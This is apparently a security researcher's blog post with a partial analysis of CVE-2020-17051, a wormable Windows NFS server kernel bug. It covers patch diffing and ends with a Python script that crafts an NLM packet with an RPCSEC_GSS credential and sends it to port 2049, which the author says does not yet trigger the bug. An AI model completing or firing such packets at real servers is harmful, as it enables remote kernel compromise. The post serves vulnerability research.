---
layout: post
title: "CVE-2020-17051 (Interrupted)"
author: "nonetype"
categories: [pwn, windows]
tags: [kernel, 1-day]
---

Partial analysis-note for CVE-2020-17051 (interrupted on bug triggering steps)

- [CVE-2020-17051](#cve-2020-17051)
  - [Abstract](#abstract)
  - [Diff](#diff)
    - [2020-10 (v10.0.17763.1490)](#2020-10-v100177631490)
    - [2020-11 (v10.0.17763.1577)](#2020-11-v100177631577)
    - [Diff-analysis](#diff-analysis)
  - [Dynamic analysis](#dynamic-analysis)
- [Refs](#refs)

# CVE-2020-17051
## Abstract
- Patched on November patch tuesday
- RCE vulnerability on NFS write routine
  - It can chain with [CVE-2020-17056](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17056), which is Info-leak vulnerability in same driver(nfssvr.sys)
- Low exploit complexity (MS-official)
- High exploitability (MS-official)
- Wormable
- Needs anonymous write access
- Windows server 2008~2004 is vulnerable

## Diff
### 2020-10 (v10.0.17763.1490)
`C:\Windows\WinSxS\amd64_microsoft-windows-nfs-servercore_31bf3856ad364e35_10.0.17763.1490_none_a92fdeaed91b92a5`
- [nfssvr_2020_10.sys](/assets/dlls/nfssvr_2020_10.sys)

### 2020-11 (v10.0.17763.1577)
`C:\Windows\WinSxS\amd64_microsoft-windows-nfs-servercore_31bf3856ad364e35_10.0.17763.1577_none_a9226eb6d9262f4f`
- [nfssvr_2020_11.sys](/assets/dlls/nfssvr_2020_11.sys)

### Diff-analysis
![Bindiff](https://i.imgur.com/sia0rDH.png "Diff 2020-10 vs 2020-11")
Checking the diff, found `NlmMapUserAndGetToken`'s if-state is changed.(Added some check logics)

![Diff-hexrays](https://i.imgur.com/GXQgCxu.png "Hex-rays diff result")
We can see the L11-L28's `*(v22+1000)` check logic is added.

## Dynamic analysis
To trigger & verify the vulnerability, we must send NLM share/unshare packet.

> For more information of NLM, see here
> 
> [https://tools.ietf.org/html/rfc1813](https://tools.ietf.org/html/rfc1813)

on user creates file on remote NFS server, kernel(or some program) sends NLM packet to server for authentication(It's my guess, may be different)

and `v23` variable on above, is NLM's RPC Credential->flavor value.

Flavor value in normal packet is 1(AUTH_UNIX or AUTH_SYS), but the bug needs 6(RPCSEC_GSS) on check routine in L11/L9.

So i wrote some python script to call `NlmMapUserAndGetToken` function.

It was hardest part on this job. (Analysis & Building packet structure is always hard..)

This code calls `NlmMapUserAndGetToken`, but needs some fix to trigger bug.
```python
import struct
import socket

def buildNew():
    frag = '80000084'
    xid = '00000202'
    msgType = '00000000'
    rpcVersion = '00000002'
    base = frag + xid + msgType + rpcVersion
    base += '000186b50000000400000014' # Prog, ProgVer, Procedure
    # Credential starts
    flavor = '00000006'
    length = '00000014'
    gssVersion = '00000001'
    gssProcedure = '00000000'
    gssSequence = '00000000'
    gssService = '00000000'
    gssHandleLen = '00000000'
    verifier_flavor = '00000000'
    verifier_credSize = '00000000'
    
    gssData = ''
    nfs = '000000000000000f4445534b544f502d54344b513838370000000020fd9c010000000600560300000000040043e2a4324802cf1418bb03baf43602f600000004000008ec000000030000000300000000'

    nfs = gssData + nfs

    return base + flavor + length + gssVersion + gssProcedure + gssSequence + gssService + gssHandleLen + verifier_flavor + verifier_credSize + nfs


def getTest(b):
    packet = b
    res = bytes.fromhex(packet)

    return res

def main():
    # test
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(10)
    sock.connect(('10.0.0.100', 2049))
    
    sock.send(getTest(buildNew()))
```


# Refs
- https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-17051-remote-kernel-heap-overflow-in-nfsv3-windows-server/
- https://www.iana.org/assignments/rpc-authentication-numbers/rpc-authentication-numbers.xhtml